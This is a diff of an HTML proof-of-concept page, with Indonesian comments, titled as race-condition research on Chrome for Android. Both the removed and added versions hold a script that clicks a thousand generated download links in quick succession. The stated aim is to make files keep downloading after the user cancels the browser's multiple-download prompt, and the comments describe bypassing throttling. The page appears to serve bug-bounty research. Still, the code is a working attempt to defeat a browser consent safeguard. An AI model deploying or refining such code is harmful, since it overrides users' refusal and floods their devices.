@@ -3,98 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Race Condition PoC - Chrome Android</title>
+    <title>Race Condition Research - Chrome Android</title>
     <style>
-        body { 
-            font-family: sans-serif; 
-            padding: 20px; 
-            text-align: center; 
-            background-color: #121212; 
-            color: #ffffff;
+        body { font-family: sans-serif; padding: 20px; text-align: center; background: #0f0f0f; color: #fff; }
+        .card { background: #1a1a1a; padding: 25px; border-radius: 15px; border: 1px solid #333; max-width: 450px; margin: auto; }
+        .btn-hunt {
+            background: linear-gradient(45deg, #d93025, #ff5252);
+            color: white; padding: 18px; border: none; border-radius: 10px;
+            font-weight: bold; width: 100%; font-size: 1.1rem; cursor: pointer;
+            box-shadow: 0 4px 15px rgba(217, 48, 37, 0.4);
         }
-        .container {
-            border: 2px solid #333;
-            padding: 30px;
-            border-radius: 15px;
-            background-color: #1e1e1e;
-            max-width: 500px;
-            margin: auto;
-        }
-        button {
-            background-color: #d93025;
-            color: white;
-            padding: 20px;
-            border: none;
-            border-radius: 10px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-        }
-        button:active { background-color: #a51717; }
-        #log {
-            margin-top: 20px;
-            font-family: monospace;
-            color: #00ff00;
-            text-align: left;
-            background: #000;
-            padding: 10px;
-            height: 150px;
-            overflow-y: auto;
-            font-size: 0.8rem;
-        }
-        .instruction { font-size: 0.9rem; color: #bbb; margin-bottom: 20px; }
+        #status { margin-top: 20px; font-family: monospace; color: #00ff00; font-size: 0.9rem; text-align: left; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>Chrome Android Vulnerability Lab</h2>
-        <p class="instruction">
-            1. Klik tombol di bawah.<br>
-            2. Saat dialog "Multiple Downloads" muncul, <b>KLIK BATAL</b>.<br>
-            3. Segera <b>TUTUP TAB</b> ini.<br>
-            4. Cek notifikasi: Jika >10 file terdownload, ini adalah <b>Race Condition</b>.
+    <div class="card">
+        <h2>🛡️ Bug Hunter Lab</h2>
+        <p style="color: #bbb; font-size: 0.9rem;">
+            Tujuan: Membuktikan <b>Persistence</b> setelah user klik <b>BATAL</b>.
         </p>
+        
+        <button class="btn-hunt" onclick="startHunting()">
+            LAUNCH ASYNC INJECTION
+        </button>
 
-        <button onclick="startRaceCondition()">LAUNCH 1000x INJECTION</button>
-
-        <div id="log">Status: Ready to Test...</div>
+        <div id="status">Status: Ready...</div>
     </div>
 
     <script>
-        function startRaceCondition() {
-            const logDiv = document.getElementById('log');
-            const totalInjections = 1000; // Titik tengah agar tidak crash tapi tembus limit
+        async function startHunting() {
+            const statusDiv = document.getElementById('status');
+            const total = 1000; // Jumlah yang cukup untuk membuktikan antrean sistem
             
-            logDiv.innerHTML += "<br>[!] Starting Injection...";
+            statusDiv.innerHTML = "[!] Initializing Task Queue...";
 
-            for (let i = 1; i <= totalInjections; i++) {
-                // Menggunakan jeda 0ms untuk membombardir Task Queue secepat mungkin
-                setTimeout(() => {
-                    try {
-                        const link = document.createElement('a');
-                        
-                        // Data URI minimalis agar beban memori rendah
-                        const content = `Evidence ID: ${i} | Time: ${Date.now()}`;
-                        link.href = "data:text/plain;base64," + btoa(content);
-                        link.download = `race_evidence_${i}.txt`;
-                        
-                        document.body.appendChild(link);
-                        link.click();
-                        document.body.removeChild(link);
+            for (let i = 1; i <= total; i++) {
+                const link = document.createElement('a');
+                
+                // Data URI minimalis
+                const data = `Evidence ID: ${i} | Timestamp: ${Date.now()}`;
+                link.href = "data:text/plain;base64," + btoa(data);
+                link.download = `race_evidence_${i}.txt`;
+                
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
 
-                        if (i % 100 === 0) {
-                            logDiv.innerHTML += `<br>[+] Sent ${i} requests...`;
-                            logDiv.scrollTop = logDiv.scrollHeight;
-                        }
-                    } catch (e) {
-                        logDiv.innerHTML += `<br>[ERROR] at ${i}: ${e.message}`;
-                    }
-                }, 0); // Eksekusi instan untuk bypass throttling UI
+                // Update UI log setiap 50 file
+                if (i % 50 === 0) {
+                    statusDiv.innerHTML += `<br>[+] Queued: ${i}/${total}`;
+                }
+
+                /* KUNCI RACE CONDITION:
+                   Memberikan jeda 1ms agar Chrome sempat memproses UI (muncul dialog),
+                   tapi antrean JS tetap berjalan di background secepat mungkin.
+                */
+                await new Promise(resolve => setTimeout(resolve, 1));
             }
             
-            logDiv.innerHTML += "<br>[!] All requests sent to queue. CLOSE TAB NOW!";
+            statusDiv.innerHTML += "<br>[DONE] All tasks sent. Check OS response.";
         }
     </script>
 
